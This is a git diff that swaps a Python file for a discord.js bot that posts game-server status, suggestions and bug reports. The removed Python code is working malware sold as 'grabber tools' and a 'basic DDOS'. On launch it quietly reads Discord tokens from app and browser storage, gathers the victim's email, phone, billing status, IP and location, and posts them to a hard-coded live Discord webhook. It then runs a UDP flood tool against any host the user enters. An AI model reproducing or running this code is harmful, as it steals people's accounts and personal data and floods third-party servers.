@@ -1,516 +1,398 @@
-##########################################################################################                 
-###########------------GRABBER TOOOLS------------------------GuhhSec#0001-----############
-######################################---------BASIC DDOS--------------###################
-##########################################################################################
-########################################################################################
+'use strict';
 
-import random
-import socket
-import threading
-import time
-import os
-import json
-import platform as plt
-from re import findall
-from base64 import b64decode
-from datetime import datetime
-from json import loads, dumps
-from subprocess import Popen, PIPE
-from urllib.request import Request, urlopen
+const Discord = require('discord.js');
+// const fetch = require('node-fetch');
+const fetchTimeout = require('fetch-timeout');
+const { paddedFullWidth, errorWrap } = require('./utils.js');
 
-os.system("cls")
-print("\u001b[37m")
-
-               
-#Your Webhooks 
-webhook_url = "WebhookKalian"
-#Scroll Ke Bawah Buat Changed Tools
-
-
-languages = {
-	'da'    : 'Danish, Denmark',
-	'de'    : 'German, Germany',
-	'en-GB' : 'English, United Kingdom',
-	'en-US' : 'English, United States',
-	'es-ES' : 'Spanish, Spain',
-	'fr'    : 'French, France',
-	'hr'    : 'Croatian, Croatia',
-	'lt'    : 'Lithuanian, Lithuania',
-	'hu'    : 'Hungarian, Hungary',
-	'nl'    : 'Dutch, Netherlands',
-	'no'    : 'Norwegian, Norway',
-	'pl'    : 'Polish, Poland',
-	'pt-BR' : 'Portuguese, Brazilian, Brazil',
-	'ro'    : 'Romanian, Romania',
-	'fi'    : 'Finnish, Finland',
-	'sv-SE' : 'Swedish, Sweden',
-	'vi'    : 'Vietnamese, Vietnam',
-	'tr'    : 'Turkish, Turkey',
-	'cs'    : 'Czech, Czechia, Czech Republic',
-	'el'    : 'Greek, Greece',
-	'bg'    : 'Bulgarian, Bulgaria',
-	'ru'    : 'Russian, Russia',
-	'uk'    : 'Ukranian, Ukraine',
-	'th'    : 'Thai, Thailand',
-	'zh-CN' : 'Chinese, China',
-	'ja'    : 'Japanese',
-	'zh-TW' : 'Chinese, Taiwan',
-	'ko'    : 'Korean, Korea'
+if (Discord.version.startsWith('12.')) {
+  // rename functions for compatibilities sake while testing
+  Discord.RichEmbed = Discord.MessageEmbed;
+  Discord.TextChannel.prototype.fetchMessage = function(snowflake) { // not perfect but whatevs
+    return this.messages.fetch.apply(this.messages,[snowflake]);
+    // return new Promise((resolve,reject) => {
+    //   let message = this.messages.fetch(snowflake);
+    //   if (message === undefined) reject(notfound);
+    //   else resolve(message);
+    // })
+  }
+  Object.defineProperty(Discord.User.prototype,'displayAvatarURL',{
+    'get': function() {
+      return this.avatarURL();
+    }
+  })
+  // Object.defineProperty(Discord.GuildMember.prototype,'voiceChannelID',{
+  //   'get': function() {
+  //     if (this.voiceStates.size > 0) {
+  //       var channelID;
+  //       for (let id in this.voiceStates) {
+  //         channelID =  this.voiceStates[id].channel.id;
+  //         console.log(this.voiceStates[id].channel);
+  //       }
+  //       return channelID;
+  //     }
+  //     return undefined;
+  //   }
+  // })
 }
 
-LOCAL = os.getenv("LOCALAPPDATA")
-ROAMING = os.getenv("APPDATA")
-PATHS = {
-	"Discord"           : ROAMING + "\\Discord",
-	"Discord Canary"    : ROAMING + "\\discordcanary",
-	"Discord PTB"       : ROAMING + "\\discordptb",
-	"Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
-	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
-	"Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-	"Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+const LOG_LEVELS = {
+  'ERROR': 3,
+  'INFO': 2,
+  'DEBUG': 1,
+  'SPAM': 0
 }
 
-def getheaders(token=None, content_type="application/json"):
-	headers = {
-		"Content-Type": content_type,
-		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
-	}
-	if token:
-		headers.update({"Authorization": token})
-	return headers
-
-def getuserdata(token):
-	try:
-		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
-	except:
-		pass
-
-def gettokens(path):
-	path += "\\Local Storage\\leveldb"
-	tokens = []
-	for file_name in os.listdir(path):
-		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
-			continue
-		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-				for token in findall(regex, line):
-					tokens.append(token)
-	return tokens
-
-def getdeveloper():
-	dev = "Guhh"
-	try:
-		dev = urlopen(Request("Hello")).read().decode()
-	except:
-		pass
-	return dev
-
-def getip():
-	ip = org = loc = city = country = region = googlemap = "None"
-	try:
-		url = 'http://ipinfo.io/json'
-		response = urlopen(url)
-		data = json.load(response)
-		ip = data['ip']
-		org = data['org']
-		loc = data['loc']
-		city = data['city']
-		country = data['country']
-		region = data['region']
-		googlemap = "https://www.google.com/maps/search/google+map++" + loc
-	except:
-		pass
-	return ip,org,loc,city,country,region,googlemap
-
-def getavatar(uid, aid):
-	url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
-	try:
-		urlopen(Request(url))
-	except:
-		url = url[:-4]
-	return url
-
-def gethwid():
-	p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-	return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
-
-def has_payment_methods(token):
-	try:
-		return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
-	except:
-		pass
-
-def main():
-	global webhook_url
-	cache_path = ROAMING + "\\.cache~$"
-	embeds = []
-	working = []
-	checked = []
-	already_cached_tokens = []
-	working_ids = []
-	computer_os = plt.platform()
-	ip,org,loc,city,country,region,googlemap = getip()
-	pc_username = os.getenv("UserName")
-	pc_name = os.getenv("COMPUTERNAME")
-	developer = getdeveloper()
-	for platform, path in PATHS.items():
-		if not os.path.exists(path):
-			continue
-		for token in gettokens(path):
-			if token in checked:
-				continue
-			checked.append(token)
-			uid = None
-			if not token.startswith("mfa."):
-				try:
-					uid = b64decode(token.split(".")[0].encode()).decode()
-				except:
-					pass
-				if not uid or uid in working_ids:
-					continue
-			user_data = getuserdata(token)
-			if not user_data:
-				continue
-			working_ids.append(uid)
-			working.append(token)
-			username = user_data["username"] + "#" + str(user_data["discriminator"])
-			user_id = user_data["id"]
-			locale = user_data['locale']
-			avatar_id = user_data["avatar"]
-			avatar_url = getavatar(user_id, avatar_id)
-			email = user_data.get("email")
-			phone = user_data.get("phone")
-			verified = user_data['verified']
-			mfa_enabled = user_data['mfa_enabled']
-			creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
-			language = languages.get(locale)
-			nitro = bool(user_data.get("premium_type"))
-			billing = bool(has_payment_methods(token))
-			embed = {
-				"color": 0xd53444,
-				"fields": [
-					{
-        				"name": "**Account information**",
-        				"value": f'`E-mail:` ||{email}||\n`Phone number:` ||{phone}||\n`Nitro:` {nitro}\n`Billing Info:` {billing}'
-        			},
-        			{
-        				"name": "**PC information**",
-        				"value": f'`Operating System:` {computer_os}\n`PC name:` {pc_username}\n`PC ID:` {pc_name}\n`Token location:` {platform}'
-        			},
-        			{
-    					"name": "**IP information**",
-        				"value": f'`IP:` ||{ip}||\n`Geo:` ||[{loc}]({googlemap})||\n`City:` ||{city}||\n`Region:` ||{region}||'
-        			},
-        			{
-        				"name": "**Other information**",
-        				"value": f'`Language:` {locale} ({language})\n`E-mail Verification:` {verified}\n`2FA/MFA Activated:` {mfa_enabled}\n`Creation Date:` {creation_date}'
-        			},
-        			{
-        				"name": "**Token**",
-        				"value": f':warning: `Token:` ||{token}||'
-        			}
-				],
-				"author": {
-					"name": f"User name: {username}  |  User ID: {user_id}",
-					"icon_url": avatar_url
-				},
-				"footer": {
-					"text": f"Grabber By {developer}"
-				}
-			}
-			embeds.append(embed)
-	with open(cache_path, "a") as file:
-		for token in checked:
-			if not token in already_cached_tokens:
-				file.write(token + "\n")
-	if len(working) == 0:
-		working.append('123')
-	webhook = {
-		"content": "",
-		"embeds": embeds,
-		"username": "GuhhSec",
-		"avatar_url": ""
-	}
-	try:
-		urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
-	except:
-		pass
-try:
-	main()
-except Exception as e:
-	print(e)
-	pass
-
-boom_url = "https://discord.com/api/webhooks/887650511900266576/Khpwt1ajNyL7aNP_8AiSjv2iDlHQ3I5DyyQx0-EXFgBMORcVe-bPZW3S1jeFIAZV8BSH"
-
-languages = {
-	'da'    : 'Danish, Denmark',
-	'de'    : 'German, Germany',
-	'en-GB' : 'English, United Kingdom',
-	'en-US' : 'English, United States',
-	'es-ES' : 'Spanish, Spain',
-	'fr'    : 'French, France',
-	'hr'    : 'Croatian, Croatia',
-	'lt'    : 'Lithuanian, Lithuania',
-	'hu'    : 'Hungarian, Hungary',
-	'nl'    : 'Dutch, Netherlands',
-	'no'    : 'Norwegian, Norway',
-	'pl'    : 'Polish, Poland',
-	'pt-BR' : 'Portuguese, Brazilian, Brazil',
-	'ro'    : 'Romanian, Romania',
-	'fi'    : 'Finnish, Finland',
-	'sv-SE' : 'Swedish, Sweden',
-	'vi'    : 'Vietnamese, Vietnam',
-	'tr'    : 'Turkish, Turkey',
-	'cs'    : 'Czech, Czechia, Czech Republic',
-	'el'    : 'Greek, Greece',
-	'bg'    : 'Bulgarian, Bulgaria',
-	'ru'    : 'Russian, Russia',
-	'uk'    : 'Ukranian, Ukraine',
-	'th'    : 'Thai, Thailand',
-	'zh-CN' : 'Chinese, China',
-	'ja'    : 'Japanese',
-	'zh-TW' : 'Chinese, Taiwan',
-	'ko'    : 'Korean, Korea'
+const BOT_CONFIG = {
+  'apiRequestMethod': 'sequential',
+  'messageCacheMaxSize': 50,
+  'messageCacheLifetime': 0,
+  'messageSweepInterval': 0,
+  'fetchAllMembers': false,
+  'disableEveryone': true,
+  'sync': false,
+  'restWsBridgeTimeout': 5000, // check these
+  'restTimeOffset': 300,
+  'disabledEvents': [
+    'CHANNEL_PINS_UPDATE',
+    'TYPING_START'
+  ],
+  'ws': {
+    'large_threshold': 100,
+    'compress': true
+  }
 }
 
-LOCAL = os.getenv("LOCALAPPDATA")
-ROAMING = os.getenv("APPDATA")
-PATHS = {
-	"Discord"           : ROAMING + "\\Discord",
-	"Discord Canary"    : ROAMING + "\\discordcanary",
-	"Discord PTB"       : ROAMING + "\\discordptb",
-	"Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
-	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
-	"Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-	"Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+const USER_AGENT = `Roofstad bot ${require('./package.json').version} , Node ${process.version} (${process.platform}${process.arch})`;
+
+exports.start = function(SETUP) {
+  const URL_SERVER = SETUP.URL_SERVER;
+
+  const URL_PLAYERS = new URL('/players.json',SETUP.URL_SERVER).toString();
+  const URL_INFO = new URL('/info.json',SETUP.URL_SERVER).toString();
+  const MAX_PLAYERS = 128;
+  const TICK_MAX = 1 << 9; // max bits for TICK_N
+  const FETCH_TIMEOUT = 900;
+  const FETCH_OPS = {
+    'cache': 'no-cache',
+    'method': 'GET',
+    'headers': { 'User-Agent': USER_AGENT }
+  };
+
+  const LOG_LEVEL = SETUP.LOG_LEVEL !== undefined ? parseInt(SETUP.LOG_LEVEL) : LOG_LEVELS.INFO;
+  const BOT_TOKEN = SETUP.BOT_TOKEN;
+  const CHANNEL_ID = SETUP.CHANNEL_ID;
+  const MESSAGE_ID = SETUP.MESSAGE_ID;
+  const SUGGESTION_CHANNEL = SETUP.SUGGESTION_CHANNEL;
+  const BUG_CHANNEL = SETUP.BUG_CHANNEL;
+  const BUG_LOG_CHANNEL = SETUP.BUG_LOG_CHANNEL;
+  const LOG_CHANNEL = SETUP.LOG_CHANNEL;
+  const STREAM_URL = SETUP.STREAM_URL;
+  const STREAM_CHANNEL = SETUP.STREAM_CHANNEL;
+  const UPDATE_TIME = 2500; // in ms
+
+  var TICK_N = 0;
+  var MESSAGE;
+  var LAST_COUNT;
+  var STATUS;
+
+  var STREAM_DISPATCHER = undefined;
+
+  var loop_callbacks = []; // for testing whether loop is still running
+
+  const log = function(level,message) {
+    if (level >= LOG_LEVEL) console.log(`${new Date().toLocaleString()} :${level}: ${message}`);
+  };
+
+  const getPlayers = function() {
+    return new Promise((resolve,reject) => {
+      fetchTimeout(URL_PLAYERS,FETCH_OPS,FETCH_TIMEOUT).then((res) => {
+        res.json().then((players) => {
+          resolve(players);
+        }).catch(reject);
+      }).catch(reject);
+    })
+  };
+
+  const getVars = function() {
+    return new Promise((resolve,reject) => {
+      fetchTimeout(URL_INFO,FETCH_OPS,FETCH_TIMEOUT).then((res) => {
+        res.json().then((info) => {
+          resolve(info.vars);
+        }).catch(reject);
+      }).catch(reject);
+    });
+  };
+
+  const bot = new Discord.Client(BOT_CONFIG);
+
+  const sendOrUpdate = function(embed) {
+    if (MESSAGE !== undefined) {
+      MESSAGE.edit(embed).then(() => {
+        log(LOG_LEVELS.DEBUG,'Update success');
+      }).catch(() => {
+        log(LOG_LEVELS.ERROR,'Update failed');
+      })
+    } else {
+      let channel = bot.channels.get(CHANNEL_ID);
+      if (channel !== undefined) {
+        channel.fetchMessage(MESSAGE_ID).then((message) => {
+          MESSAGE = message;
+          message.edit(embed).then(() => {
+            log(LOG_LEVELS.SPAM,'Update success');
+          }).catch(() => {
+            log(LOG_LEVELS.ERROR,'Update failed');
+          });
+        }).catch(() => {
+          channel.send(embed).then((message) => {
+            MESSAGE = message;
+            log(LOG_LEVELS.INFO,`Sent message (${message.id})`);
+          }).catch(console.error);
+        })
+      } else {
+        log(LOG_LEVELS.ERROR,'Update channel not set');
+      }
+    }
+  };
+
+  const UpdateEmbed = function() {
+    let dot = TICK_N % 2 === 0 ? 'Roofstad' : 'Roleplay';
+    let embed = new Discord.RichEmbed()
+    .setAuthor("Angga Ariska Server Status", "https://cdn.discordapp.com/attachments/810946286073151500/812746735017000990/jadi.png")
+    .setColor(0x2894C2)
+    .setFooter(TICK_N % 2 === 0 ? '⚪ AnggaAriska' : '⚫ AnggaAriska')
+    .setTimestamp(new Date())
+    .addField('\n\u200b\nBagaimana Anda bisa bergabung dengan server?','Anda dapat bergabung dengan server dengan mendownload **Launcher** di website. Di bagian bawah adalah status server untuk melihat berapa banyak orang yang sedang online dan dalam antrian. Sistem ini dibuat oleh Angga Ariska\n\u200b\n',false)
+    if (STATUS !== undefined)
+    {
+      embed.addField(':warning: Actuele server status:',`${STATUS}\n\u200b\n`);
+      embed.setColor(0xff5d00)
+    }
+    return embed;
+  };
+
+  const offline = function() {
+    log(LOG_LEVELS.SPAM,Array.from(arguments));
+    if (LAST_COUNT !== null) log(LOG_LEVELS.INFO,`Server offline ${URL_SERVER} (${URL_PLAYERS} ${URL_INFO})`);
+    let embed = UpdateEmbed()
+    .setColor(0xff0000)
+    .addField('Server Status',':x: Offline',true)
+    .addField('Antrian','?',true)
+    .addField('Player Online','?\n\u200b\n',true);
+    sendOrUpdate(embed);
+    LAST_COUNT = null;
+  };
+
+  const updateMessage = function() {
+    getVars().then((vars) => {
+      getPlayers().then((players) => {
+        if (players.length !== LAST_COUNT) log(LOG_LEVELS.INFO,`${players.length} players`);
+        let queue = vars['Queue'];
+        let embed = UpdateEmbed()
+        .addField('Server Status',':white_check_mark: Online',true)
+        .addField('Antrian',queue === 'Enabled' || queue === undefined ? '0' : queue.split(':')[1].trim(),true)
+        .addField('Player Online',`${players.length}/${MAX_PLAYERS}\n\u200b\n`,true);
+        // .addField('\u200b','\u200b\n\u200b\n',true);
+        if (players.length > 0) {
+          // method D
+          const fieldCount = 3;
+          const fields = new Array(fieldCount);
+          fields.fill('');
+          // for (var i=0;i<players.length;i++) {
+          //   fields[i%4 >= 2 ? 1 : 0] += `${players[i].name}${i % 2 === 0 ? '\u200e' : '\n\u200f'}`;
+          // }
+          fields[0] = `**Penduduk:**\n`;
+          for (var i=0;i<players.length;i++) {
+            fields[(i+1)%fieldCount] += `${players[i].name.substr(0,12)}\n`; // first 12 characters of players name
+          }
+          for (var i=0;i<fields.length;i++) {
+            let field = fields[i];
+            if (field.length > 0) embed.addField('\u200b',field,true);
+          }
+
+          // method A
+          // let maxLen = 8;
+          // var text = '';
+          // for (var i=0;i<players.length;i++) {
+          //   var eol = false;
+          //   if ((i+1) % 3 === 0) eol = true;
+          //   text += paddedFullWidth(players[i].name,eol ? players[i].name.length : maxLen);
+          //   if (eol) text += '\n';
+          // }
+          // embed.addField('Spelers',`**${text}**`,false);
+
+          // method B
+          // embed.addField('Spelers','\u200b',false);
+          // for (var player of players) {
+          //   embed.addField('\u200b',player.name,true);
+          // }
+          // for (var i=0;i<3-(players.length%3);i++) {
+          //   embed.addField('\u200b','\u200b',false);
+          // }
+
+          // method C
+          // let playerNames = Array.from(players.values()).map((c) => `**${c.name}**`).join(', ');
+          // embed.addField('Spelers',playerNames,false);
+        }
+        sendOrUpdate(embed);
+        LAST_COUNT = players.length;
+      }).catch(offline);
+    }).catch(offline);
+    TICK_N++;
+    if (TICK_N >= TICK_MAX) {
+      TICK_N = 0;
+    }
+    for (var i=0;i<loop_callbacks.length;i++) {
+      let callback = loop_callbacks.pop(0);
+      callback();
+    }
+  };
+
+  bot.on('ready',() => {
+    log(LOG_LEVELS.INFO,'Started...');
+    // bot.user.setGame('Roofstad', 'https://www.twitch.tv/RoqueTV');
+    bot.user.setActivity('IndolandRP',{'url':'https://www.youtube.com/channel/UCkqMw81s2aw7bYO-U2YhD7w?view_as=subscriber','type':'STREAMING'});
+    bot.generateInvite(['ADMINISTRATOR']).then((link) => {
+      log(LOG_LEVELS.INFO,`Invite URL - ${link}`);
+    }).catch(null);
+    bot.setInterval(updateMessage, UPDATE_TIME);
+    // use VoiceBroadcasts for multiple channels
+  });
+
+  function checkLoop() {
+    return new Promise((resolve,reject) => {
+      var resolved = false;
+      let id = loop_callbacks.push(() => {
+        if (!resolved) {
+          resolved = true;
+          resolve(true);
+        } else {
+          log(LOG_LEVELS.ERROR,'Loop callback called after timeout');
+          reject(null);
+        }
+      })
+      setTimeout(() => {
+        if (!resolved) {
+          resolved = true;
+          resolve(false);
+        }
+      },3000);
+    })
+  }
+
+  bot.on('debug',(info) => {
+    log(LOG_LEVELS.SPAM,info);
+  })
+
+  bot.on('error',(error,shard) => {
+    log(LOG_LEVELS.ERROR,error);
+  })
+
+  bot.on('warn',(info) => {
+    log(LOG_LEVELS.DEBUG,info);
+  })
+
+  bot.on('disconnect',(devent,shard) => {
+    log(LOG_LEVELS.INFO,'Disconnected');
+    checkLoop().then((running) => {
+      log(LOG_LEVELS.INFO,`Loop still running: ${running}`);
+    }).catch(console.error);
+  })
+
+  bot.on('reconnecting',(shard) => {
+    log(LOG_LEVELS.INFO,'Reconnecting');
+    checkLoop().then((running) => {
+      log(LOG_LEVELS.INFO,`Loop still running: ${running}`);
+    }).catch(console.error);
+  })
+
+  bot.on('resume',(replayed,shard) => {
+    log(LOG_LEVELS.INFO,`Resuming (${replayed} events replayed)`);
+    checkLoop().then((running) => {
+      log(LOG_LEVELS.INFO,`Loop still running: ${running}`);
+    }).catch(console.error);
+  })
+
+  bot.on('rateLimit',(info) => {
+    log(LOG_LEVELS.INFO,`Rate limit hit ${info.timeDifference ? info.timeDifference : info.timeout ? info.timeout : 'Unknown timeout '}ms (${info.path} / ${info.requestLimit ? info.requestLimit : info.limit ? info.limit : 'Unkown limit'})`);
+    if (info.path.startsWith(`/channels/${CHANNEL_ID}/messages/${MESSAGE_ID ? MESSAGE_ID : MESSAGE ? MESSAGE.id : ''}`)) bot.emit('restart');
+    checkLoop().then((running) => {
+      log(LOG_LEVELS.DEBUG,`Loop still running: ${running}`);
+    }).catch(console.error);
+  })
+  
+  bot.on('message', async function (msg) {
+    if (msg.channel.id === '586631869928308743') {
+        await msg.react(bot.emojis.get('587057796936368128'));
+        await msg.react(bot.emojis.get('595353996626231326'));
+    }
+});
+
+  bot.on('message',(message) => {
+    if (!message.author.bot) {
+      if (message.member) {
+        if (message.member.hasPermission('ADMINISTRATOR')) {
+          if (message.content.startsWith('+status ')) {
+            let status = message.content.substr(7).trim();
+            let embed =  new Discord.RichEmbed()
+            .setAuthor(message.member.nickname ? message.member.nickname : message.author.tag,message.author.displayAvatarURL)
+            .setColor(0x2894C2)
+            .setTitle('Updated status message')
+            .setTimestamp(new Date());
+            if (status === 'clear') {
+              STATUS = undefined;
+              embed.setDescription('Cleared status message');
+            } else {
+              STATUS = status;
+              embed.setDescription(`New message:\n\`\`\`${STATUS}\`\`\``);
+            }
+            bot.channels.get(LOG_CHANNEL).send(embed);
+            return log(LOG_LEVELS.INFO,`${message.author.username} updated status`);
+          }
+        }
+        if (message.channel.id === SUGGESTION_CHANNEL) {
+          let embed = new Discord.RichEmbed()
+          .setAuthor(message.member.nickname ? message.member.nickname : message.author.tag,message.author.displayAvatarURL)
+          .setColor(0x2894C2)
+          .setTitle('Suggestie')
+          .setDescription(message.content)
+          .setTimestamp(new Date());
+          message.channel.send(embed).then((message) => {
+            const sent = message;
+            sent.react('👍').then(() => {
+              sent.react('👎').then(() => {
+                log(LOG_LEVELS.SPAM,'Completed suggestion message');
+              }).catch(console.error);
+            }).catch(console.error);
+          }).catch(console.error);
+          return message.delete();
+        }
+        if (message.channel.id === BUG_CHANNEL) {
+          let embedUser = new Discord.RichEmbed()
+          .setAuthor(message.member.nickname ? message.member.nickname : message.author.tag,message.author.displayAvatarURL)
+          .setColor(0x2894C2)
+          .setTitle('Bug Report')
+          .setDescription('Je bericht is succesvol gestuurd naar het staff-team!')
+          .setTimestamp(new Date());
+          let embedStaff = new Discord.RichEmbed()
+          .setAuthor(message.member.nickname ? message.member.nickname : message.author.tag,message.author.displayAvatarURL)
+          .setColor(0x2894C2)
+          .setTitle('Bug Report')
+          .setDescription(message.content)
+          .setTimestamp(new Date());
+          message.channel.send(embedUser).then(null).catch(console.error);
+          bot.channels.get(BUG_LOG_CHANNEL).send(embedStaff).then(null).catch(console.error);
+          return message.delete();
+        }
+      }
+    }
+  });
+
+  bot.login(BOT_TOKEN).then(null).catch(() => {
+    log(LOG_LEVELS.ERROR,'Unable to login check your login token');
+    console.error(e);
+    process.exit(1);
+  });
+
+  return bot;
 }
-
-def getheaders(token=None, content_type="application/json"):
-	headers = {
-		"Content-Type": content_type,
-		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
-	}
-	if token:
-		headers.update({"Authorization": token})
-	return headers
-
-def getuserdata(token):
-	try:
-		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
-	except:
-		pass
-
-def gettokens(path):
-	path += "\\Local Storage\\leveldb"
-	tokens = []
-	for file_name in os.listdir(path):
-		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
-			continue
-		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-				for token in findall(regex, line):
-					tokens.append(token)
-	return tokens
-
-def getdeveloper():
-	dev = "Guhh"
-	try:
-		dev = urlopen(Request("Hello")).read().decode()
-	except:
-		pass
-	return dev
-
-def getip():
-	ip = org = loc = city = country = region = googlemap = "None"
-	try:
-		url = 'http://ipinfo.io/json'
-		response = urlopen(url)
-		data = json.load(response)
-		ip = data['ip']
-		org = data['org']
-		loc = data['loc']
-		city = data['city']
-		country = data['country']
-		region = data['region']
-		googlemap = "https://www.google.com/maps/search/google+map++" + loc
-	except:
-		pass
-	return ip,org,loc,city,country,region,googlemap
-
-def getavatar(uid, aid):
-	url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
-	try:
-		urlopen(Request(url))
-	except:
-		url = url[:-4]
-	return url
-
-def gethwid():
-	p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-	return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
-
-def has_payment_methods(token):
-	try:
-		return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
-	except:
-		pass
-
-def main():
-	global boom_url
-	cache_path = ROAMING + "\\.cache~$"
-	embeds = []
-	working = []
-	checked = []
-	already_cached_tokens = []
-	working_ids = []
-	computer_os = plt.platform()
-	ip,org,loc,city,country,region,googlemap = getip()
-	pc_username = os.getenv("UserName")
-	pc_name = os.getenv("COMPUTERNAME")
-	developer = getdeveloper()
-	for platform, path in PATHS.items():
-		if not os.path.exists(path):
-			continue
-		for token in gettokens(path):
-			if token in checked:
-				continue
-			checked.append(token)
-			uid = None
-			if not token.startswith("mfa."):
-				try:
-					uid = b64decode(token.split(".")[0].encode()).decode()
-				except:
-					pass
-				if not uid or uid in working_ids:
-					continue
-			user_data = getuserdata(token)
-			if not user_data:
-				continue
-			working_ids.append(uid)
-			working.append(token)
-			username = user_data["username"] + "#" + str(user_data["discriminator"])
-			user_id = user_data["id"]
-			locale = user_data['locale']
-			avatar_id = user_data["avatar"]
-			avatar_url = getavatar(user_id, avatar_id)
-			email = user_data.get("email")
-			phone = user_data.get("phone")
-			verified = user_data['verified']
-			mfa_enabled = user_data['mfa_enabled']
-			creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
-			language = languages.get(locale)
-			nitro = bool(user_data.get("premium_type"))
-			billing = bool(has_payment_methods(token))
-			embed = {
-				"color": 0xd53444,
-				"fields": [
-					{
-        				"name": "**Account information**",
-        				"value": f'`E-mail:` ||{email}||\n`Phone number:` ||{phone}||\n`Nitro:` {nitro}\n`Billing Info:` {billing}'
-        			},
-        			{
-        				"name": "**PC information**",
-        				"value": f'`Operating System:` {computer_os}\n`PC name:` {pc_username}\n`PC ID:` {pc_name}\n`Token location:` {platform}'
-        			},
-        			{
-    					"name": "**IP information**",
-        				"value": f'`IP:` ||{ip}||\n`Geo:` ||[{loc}]({googlemap})||\n`City:` ||{city}||\n`Region:` ||{region}||'
-        			},
-        			{
-        				"name": "**Other information**",
-        				"value": f'`Language:` {locale} ({language})\n`E-mail Verification:` {verified}\n`2FA/MFA Activated:` {mfa_enabled}\n`Creation Date:` {creation_date}'
-        			},
-        			{
-        				"name": "**Token**",
-        				"value": f':warning: `Token:` ||{token}||'
-        			}
-				],
-				"author": {
-					"name": f"User name: {username}  |  User ID: {user_id}",
-					"icon_url": avatar_url
-				},
-				"footer": {
-					"text": f"Grabber By {developer}"
-				}
-			}
-			embeds.append(embed)
-	with open(cache_path, "a") as file:
-		for token in checked:
-			if not token in already_cached_tokens:
-				file.write(token + "\n")
-	if len(working) == 0:
-		working.append('123')
-	webhook = {
-		"content": "",
-		"embeds": embeds,
-		"username": "GuhhSec",
-		"avatar_url": "https://media.discordapp.net/attachments/950394270257401886/955725399147548702/Screenshot_2022-03-22-12-01-16-34.jpg"
-	}
-	try:
-		urlopen(Request(boom_url, data=dumps(webhook).encode(), headers=getheaders()))
-	except:
-		pass
-try:
-	main()
-except Exception as e:
-	print(e)
-	pass
-
-os.system("cls")
-#login tools
-password ="220808"
-
-for i in range(3):
-	pwd = input(" Type (220808): ")
-	j=3
-	if(pwd==password):
-		time.sleep(5)
-		print("Tunggu Beberapa Detik!!! ")
-		break
-	else:
-		time.sleep(5)
-		print("Salah!,Kamu Typo ")
-		continue
-time.sleep(5)
-print("Benar!!,Kamu Sudah Mengetik \u001b[33m220808")
-time.sleep(5)
-
-print("""
-\u001b[31m
-▒█▀▀█ █░░█ █░░█ █░░█ ▒█▀▀▀█ █▀▀ █▀▀ 
-""")
-print("""
-\u001b[31m
-▒█░▄▄ █░░█ █▀▀█ █▀▀█ ░▀▀▀▄▄ █▀▀ █░░ 
-""")
-print("""\u001b[31m
-▒█▄▄█ ░▀▀▀ ▀░░▀ ▀░░▀ ▒█▄▄▄█ ▀▀▀ ▀▀▀
-""")
-ip = str(input("   \u001b[31m \u001b[37mIp/Host :\u001b[31m  "))
-time.sleep(3)
-print(" ")
-port = int(input("   \u001b[31m \u001b[37mPort Server :\u001b[31m  "))
-print(" ")
-times = int(input("   \u001b[31m \u001b[37mConnections :\u001b[31m  "))
-print(" ")
-threads = int(input("   \u001b[31m \u001b[37mThreading :\u001b[31m  "))
-time.sleep(3)
-
-# Attack
-def wt():
-	data = random._urandom(9999)
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print(f"\u001b[33mAttack To Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")
-		except:
-			print(f"\u001b[33mAttack To Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")
-
-# Threads
-for y in range(threads):
-	th = threading.Thread(target = wt)
-	th.start()
